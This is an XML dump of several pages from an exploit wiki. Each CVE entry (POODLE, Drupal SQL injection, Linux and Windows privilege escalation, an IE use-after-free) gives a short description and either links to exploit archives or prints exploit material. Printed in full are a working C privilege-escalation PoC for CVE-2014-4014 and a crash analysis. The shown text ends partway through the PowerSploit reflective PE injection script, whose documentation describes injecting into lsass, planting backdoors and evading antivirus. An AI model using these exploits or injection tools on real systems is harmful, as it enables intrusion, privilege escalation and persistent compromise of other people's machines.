      <text bytes="328" sha1="duniiywq1cdfiv85mgjlmd7vdjvz53x" xml:space="preserve">==INFO==
The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other products, uses nondeterministic CBC padding, which makes it easier for man-in-the-middle attackers to obtain cleartext data via a padding-oracle attack, aka the "POODLE" issue.


==POC==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-3566.zip</text>
      <sha1>duniiywq1cdfiv85mgjlmd7vdjvz53x</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-3704 Drupal core 7.x before 7.32 SQL注入漏洞</title>
    <ns>0</ns>
    <id>821</id>
    <revision>
      <id>1078</id>
      <timestamp>2021-04-07T03:31:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== The expandArguments function in the database abstraction API in Drupal core 7.x before 7.32 does not properly construct prepared statements, which allows remote attac..."</comment>
      <origin>1078</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="327" sha1="m01fhya6gvnwpbo00dj52ni1v41ymm7" xml:space="preserve">==INFO==
The expandArguments function in the database abstraction API in Drupal core 7.x before 7.32 does not properly construct prepared statements, which allows remote attackers to conduct SQL injection attacks via an array containing crafted keys.


==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-3704.zip</text>
      <sha1>m01fhya6gvnwpbo00dj52ni1v41ymm7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-4014 Linux kernel before 3.14.8 權限提升漏洞</title>
    <ns>0</ns>
    <id>822</id>
    <revision>
      <id>1079</id>
      <timestamp>2021-04-07T03:33:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== The capabilities implementation in the Linux kernel before 3.14.8 does not properly consider that namespaces are inapplicable to inodes, which allows local users to b..."</comment>
      <origin>1079</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1930" sha1="a52t7e5thv4u19hydqw0o28780fn194" xml:space="preserve">==INFO==
The capabilities implementation in the Linux kernel before 3.14.8 does not properly consider that namespaces are inapplicable to inodes, which allows local users to bypass intended chmod restrictions by first creating a user namespace, as demonstrated by setting the setgid bit on a file with group ownership of root.

==cve-2014-4014.c==
&lt;pre&gt;
/**
 * CVE-2014-4014 Linux Kernel Local Privilege Escalation PoC
 *
 * Vitaly Nikolenko
 * vnik5287@gmail.com
 */

#define _GNU_SOURCE
#include &lt;sys/wait.h&gt;
#include &lt;sched.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;limits.h&gt;
#include &lt;string.h&gt;
#include &lt;assert.h&gt;

#define STACK_SIZE (1024 * 1024)
static char child_stack[STACK_SIZE];

struct args {
    int pipe_fd[2];
    char *file_path;
};

static int child(void *arg) {
    struct args *f_args = (struct args *)arg;
    char c;

    // close stdout
    close(f_args-&gt;pipe_fd[1]); 

    assert(read(f_args-&gt;pipe_fd[0], &amp;c, 1) == 0);

    // set the setgid bit
    chmod(f_args-&gt;file_path, S_ISGID|S_IRUSR|S_IWUSR|S_IRGRP|S_IXGRP|S_IXUSR);

    return 0;
}

int main(int argc, char *argv[]) {
    int fd;
    pid_t pid;
    char mapping[1024];
    char map_file[PATH_MAX];
    struct args f_args;

    assert(argc == 2);

    f_args.file_path = argv[1];
    // create a pipe for synching the child and parent
    assert(pipe(f_args.pipe_fd) != -1);

    pid = clone(child, child_stack + STACK_SIZE, CLONE_NEWUSER | SIGCHLD, &amp;f_args);
    assert(pid != -1);

    // get the current uid outside the namespace
    snprintf(mapping, 1024, "0 %d 1\n", getuid()); 

    // update uid and gid maps in the child
    snprintf(map_file, PATH_MAX, "/proc/%ld/uid_map", (long) pid);
    fd = open(map_file, O_RDWR); assert(fd != -1);

    assert(write(fd, mapping, strlen(mapping)) == strlen(mapping));
    close(f_args.pipe_fd[1]);

    assert (waitpid(pid, NULL, 0) != -1);
}

&lt;/pre&gt;</text>
      <sha1>a52t7e5thv4u19hydqw0o28780fn194</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-4076 Microsoft Windows Server 2003 SP2特權提升漏洞</title>
    <ns>0</ns>
    <id>823</id>
    <revision>
      <id>1080</id>
      <timestamp>2021-04-07T03:34:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Microsoft Windows Server 2003 SP2 allows local users to gain privileges via a crafted IOCTL call to (1) tcpip.sys or (2) tcpip6.sys, aka "TCP/IP Elevation of Privileg..."</comment>
      <origin>1080</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="268" sha1="su391enz9wdg1hmvbkmpx27qtw85l0o" xml:space="preserve">==INFO==
Microsoft Windows Server 2003 SP2 allows local users to gain privileges via a crafted IOCTL call to (1) tcpip.sys or (2) tcpip6.sys, aka "TCP/IP Elevation of Privilege Vulnerability."

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-4076.zip</text>
      <sha1>su391enz9wdg1hmvbkmpx27qtw85l0o</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-4109 Microsoft Internet Explorer 6 through 11 內存損壞漏洞</title>
    <ns>0</ns>
    <id>824</id>
    <revision>
      <id>1081</id>
      <timestamp>2021-04-07T03:36:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Microsoft Internet Explorer 6 through 11 allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted web site, ak..."</comment>
      <origin>1081</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7931" sha1="537epv81dcvuyjwctzko4a55bf14b34" xml:space="preserve">==INFO==
Microsoft Internet Explorer 6 through 11 allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted web site, aka "Internet Explorer Memory Corruption Vulnerability," a different vulnerability than CVE-2014-2799, CVE-2014-4059, CVE-2014-4065, CVE-2014-4079, CVE-2014-4081, CVE-2014-4083, CVE-2014-4085, CVE-2014-4088, CVE-2014-4090, CVE-2014-4094, CVE-2014-4097, CVE-2014-4100, CVE-2014-4103, CVE-2014-4104, CVE-2014-4105, CVE-2014-4106, CVE-2014-4107, CVE-2014-4108, CVE-2014-4110, and CVE-2014-4111.

&lt;pre&gt;
This crash is difficult to reproduce.  The included proof of concept makes it a little easier to trigger the crashing code path.  My super scientific process of checking the crash was to click on the url with one hand and press enter with the other.  It usually crashes within 15 attempts.  "IE=9" also helps but isnt needed.

Its is a use after free of a script element.

		eax=00000000 ebx=00000000 ecx=094c9bd8 edx=00000000 esi=00000000 edi=094c9bd8
		eip=6d94ab83 esp=0943ca7c ebp=0943caa8 iopl=0         nv up ei pl zr na pe nc
		cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
		MSHTML!CMarkup::IsPrimaryMarkup+0xa:
		6d94ab83 8b87a4000000    mov     eax,dword ptr [edi+0A4h] ds:002b:094c9c7c=????????
		0:007&gt; !heap -p -a edi
		    address 094c9bd8 found in
		    _DPH_HEAP_ROOT @ 9441000
		    in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
		                                    9442af8:          94c9000             2000
		    754690b2 verifier!AVrfDebugPageHeapFree+0x000000c2
		    77cd1564 ntdll!RtlDebugFreeHeap+0x0000002f
		    77c8ac29 ntdll!RtlpFreeHeap+0x0000005d
		    77c334a2 ntdll!RtlFreeHeap+0x00000142
		    769614ad kernel32!HeapFree+0x00000014
		    6df61fa7 MSHTML!CMarkup::`scalar deleting destructor'+0x00000036
		    6db62649 MSHTML!CBase::SubRelease+0x0000002e
		    6d9bf02f MSHTML!CEventMgr::Dispatch+0x000005ba
		    6d9f5ae5 MSHTML!CEventMgr::DispatchEvent+0x00000115
		    6d9edcec MSHTML!COmWindowProxy::Fire_onload+0x0000016b
		    6e18cccc MSHTML!COmWindowProxy::DeferredFire_onload+0x0000000d  &lt;---------------unique to crash stack trace
		    6d9c05c9 MSHTML!CAsyncEventQueue::DispatchAllEvents+0x00000086
		    6d9c0776 MSHTML!GlobalWndProc+0x000001df
		    75e362fa user32!InternalCallWinProc+0x00000023
		    75e36d3a user32!UserCallWinProcCheckWow+0x00000109
		    75e377c4 user32!DispatchMessageWorker+0x000003bc
		    75e3788a user32!DispatchMessageW+0x0000000f
		    7148bdfc IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000445
		    715d602f IEFRAME!LCIETab_ThreadProc+0x0000031c
		    7649d14c iertutil!_IsoThreadProc_WrapperToReleaseScope+0x0000000e
		    754d31cc IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x00000071
		    7696338a kernel32!BaseThreadInitThunk+0x0000000e
		    77c39f72 ntdll!__RtlUserThreadStart+0x00000070
		    77c39f45 ntdll!_RtlUserThreadStart+0x0000001b

The !heap command shows that edi was free'd.  This memory is then accessed in the crash.

		0:007&gt; kb
		ChildEBP RetAddr  Args to Child              
		0943ca80 6df774f2 0d3c6fd8 10045ff0 1029ff01 MSHTML!CMarkup::IsPrimaryMarkup+0xa
		0943caa8 6e18cccc 0943cad8 6d9c05c9 0b6eff68 MSHTML!COmWindowProxy::Fire_onload+0x1bb
		0943cab0 6d9c05c9 0b6eff68 00000000 0b584cd0 MSHTML!COmWindowProxy::DeferredFire_onload+0xd  &lt;---------------boom
		0943cad8 6d9c0776 00000001 10fbb424 00000000 MSHTML!CAsyncEventQueue::DispatchAllEvents+0x86
		0943cb28 75e362fa 000d03e4 0000001c 1029fff0 MSHTML!GlobalWndProc+0x1df
		0943cb54 75e36d3a 6d929676 000d03e4 00008003 user32!InternalCallWinProc+0x23
		0943cbcc 75e377c4 00000000 6d929676 000d03e4 user32!UserCallWinProcCheckWow+0x109
		0943cc2c 75e3788a 6d929676 00000000 0943fdfc user32!DispatchMessageWorker+0x3bc
		0943cc3c 7148bdfc 0943cc84 08e35fe0 00000000 user32!DispatchMessageW+0xf
		0943fdfc 715d602f 00000001 040e0ff0 08ab1fe8 IEFRAME!CTabWindow::_TabWindowThreadProc+0x445
		0943feb4 7649d14c 040dee48 00000000 0943fef0 IEFRAME!LCIETab_ThreadProc+0x31c
		0943fec4 754d31cc 040e0ff0 00000000 7649d13e iertutil!_IsoThreadProc_WrapperToReleaseScope+0xe
		0943fef0 7696338a 08ab1fe8 0943ff3c 77c39f72 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x71
		0943fefc 77c39f72 08ab1fe8 7bd40320 00000000 kernel32!BaseThreadInitThunk+0xe
		0943ff3c 77c39f45 754d315b 08ab1fe8 ffffffff ntdll!__RtlUserThreadStart+0x70
		0943ff54 00000000 754d315b 08ab1fe8 00000000 ntdll!_RtlUserThreadStart+0x1b

The crash only occurs when the DeferredFire_onload code path is taken.  This does not always happen and I haven't tried to figure out why.

In windbg you can use something like bp mshtml + 0x2a2635 "!heap -p -a ecx;dds @ecx L1;g" to print out the object being sent to CBase::SubRelease() and you'll see the following:

		0f368f38  704625b0 MSHTML!CScriptElement::`vftable'  &lt;----dds shows a script element
		    address 0f36cbd8 found in
		    _DPH_HEAP_ROOT @ b0f1000
		    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
		                                 b0f39f4:          f36cbd8              428 -          f36c000             2000
		          MSHTML!CMarkup::`vftable'
		    75528e89 verifier!AVrfDebugPageHeapAllocate+0x00000229
		    77cd0d96 ntdll!RtlDebugAllocateHeap+0x00000030
		    77c8af0d ntdll!RtlpAllocateHeap+0x000000c4
		    77c33cfe ntdll!RtlAllocateHeap+0x0000023a
		    754a1504 vfbasics!AVrfpRtlAllocateHeap+0x000000c3
		    70c4e993 MSHTML!_MemIsolatedAllocClear+0x00000010
		    704830b1 MSHTML!CDoc::DoNavigate_CreateMarkupForExistingWindow+0x00000057
		    708716e8 MSHTML!CDoc::DoNavigate+0x000008ae
		    704804e5 MSHTML!CDoc::FollowHyperlink2+0x0000096c
		    70483748 MSHTML!CWindow::SuperNavigateInternal+0x00000213
		    704837f0 MSHTML!CWindow::SuperNavigate2WithBindFlags+0x00000034
		    72637ba8 IEFRAME!CDocObjectHost::_NavigateDocument+0x0000019e
		    726379e1 IEFRAME!CDocObjectHost::SetTarget+0x00000411
		    7251eb63 IEFRAME!CDocObjectView::_CreateViewWindow+0x000000f5
		    7251ea1b IEFRAME!CDocObjectView::CreateViewWindow3+0x00000073
		    724de827 IEFRAME!FileCabinet_CreateViewWindow2+0x00000132
		    7251f667 IEFRAME!CBaseBrowser2::_CreateViewWindow+0x0000003a
		    7251f57a IEFRAME!CBaseBrowser2::_CreateNewShellView+0x0000016a
		    7251f3e5 IEFRAME!CBaseBrowser2::_CreateNewShellViewPidl+0x00000099
		    7251f29b IEFRAME!CBaseBrowser2::v_NavigateToPidl+0x0000019d
		    72638131 IEFRAME!CBaseBrowser2::_OnGoto+0x0000024c
		    72637edb IEFRAME!CBaseBrowser2::_OnAsyncOperation+0x00000043
		    724e1274 IEFRAME!CBaseBrowser2::v_WndProc+0x00000160
		    724dcace IEFRAME!CShellBrowser2::v_WndProc+0x000001ae
		    724c872d IEFRAME!CShellBrowser2::s_WndProc+0x00000058
		    75e362fa user32!InternalCallWinProc+0x00000023
		    75e36d3a user32!UserCallWinProcCheckWow+0x00000109
		    75e377c4 user32!DispatchMessageWorker+0x000003bc
		    75e3788a user32!DispatchMessageW+0x0000000f
		    724cbdfc IEFRAME!CTabWindow::_TabWindowThreadProc+0x00000445
		    7261602f IEFRAME!LCIETab_ThreadProc+0x0000031c
		    7649d14c iertutil!_IsoThreadProc_WrapperToReleaseScope+0x0000000e

		 
		0f36cbd8  70199aa0 MSHTML!CMarkup::`vftable'
		(674.338): Access violation - code c0000005 (first chance)
		First chance exceptions are reported before any exception handling.
		This exception may be expected and handled.
		eax=00000000 ebx=00000000 ecx=0f36cbd8 edx=00000000 esi=00000000 edi=0f36cbd8
		eip=701eab83 esp=0aeec674 ebp=0aeec6a0 iopl=0         nv up ei pl zr na pe nc
		cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
		MSHTML!CMarkup::IsPrimaryMarkup+0xa:
		701eab83 8b87a4000000    mov     eax,dword ptr [edi+0A4h] ds:002b:0f36cc7c=????????

The document.write() call in the proof of concept have nothing to do with the vulnerability, its just something that eats cycles.

@day6reak
&lt;/pre&gt;</text>
      <sha1>537epv81dcvuyjwctzko4a55bf14b34</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-4113 Win32k.sys特權提升漏洞</title>
    <ns>0</ns>
    <id>825</id>
    <revision>
      <id>1082</id>
      <timestamp>2021-04-07T03:38:56Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== win32k.sys in the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8..."</comment>
      <origin>1082</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="262181" sha1="arzn8wgixml2emzlt3o7pcoyy2iwkoh" xml:space="preserve">==INFO==
win32k.sys in the kernel-mode drivers in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows 7 SP1, Windows 8, Windows 8.1, Windows Server 2012 Gold and R2, and Windows RT Gold and 8.1 allows local users to gain privileges via a crafted application, as exploited in the wild in October 2014, aka "Win32k.sys Elevation of Privilege Vulnerability."


==⚠️️==
PowerShell CVE-2014-4113

x64 Windows Only

==Invoke-SystemShell.ps1==
&lt;pre&gt;
function Invoke-ReflectivePEInjection
{
&lt;#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
please lead the Notes section (GENERAL NOTES) for information on how to use them.


1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.


2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
remote process. 


While this script provides functionality to specify a file to load from disk or from a URL, these are more for demo purposes. The way I'd recommend using the script is to create a byte array
containing the file you'd like to reflectively load, and hardcode that byte array in to the script. One advantage of doing this is you can encrypt the byte array and decrypt it in memory, which will
bypass A/V. Another advantage is you won't be making web requests. The script can also load files from SQL Server and be used as a SQL Server backdoor. Please see the Casaba
blog linked below (thanks to whitey).

PowerSploit Function: Invoke-ReflectivePEInjection
Author: Joe Bialek, Twitter: @JosephBialek
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
Version: 1.2

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEPath

The path of the DLL/EXE to load and execute. This file must exist on the computer the script is being run on, not the remote computer.

.PARAMETER PEUrl

A URL containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
	Options: String, WString, Void. See notes for more information.
	IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
	
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.
	
.EXAMPLE

Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().
Note that the file name on the website can be any file extension.
Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	the wchar_t* returned by WStringFunc() from all the computers.
Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
	-Can return DLL output to user when run remotely or locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running pentest tools on remote computers without triggering process monitoring alerts.
	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
	-Can NOT return DLL output to the user when run remotely OR locally.
	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.



DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t*   : FuncReturnType = WString
char*      : FuncReturnType = String
void       : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString    : WStringFunc
String     : StringFunc
Void       : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

Blog: http://clymb3r.wordpress.com/
Github repo: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectivePEInjection

Blog on reflective loading: http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/
Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/

#&gt;

[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Parameter(Position = 6)]
    [Switch]
    $ForceASLR
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
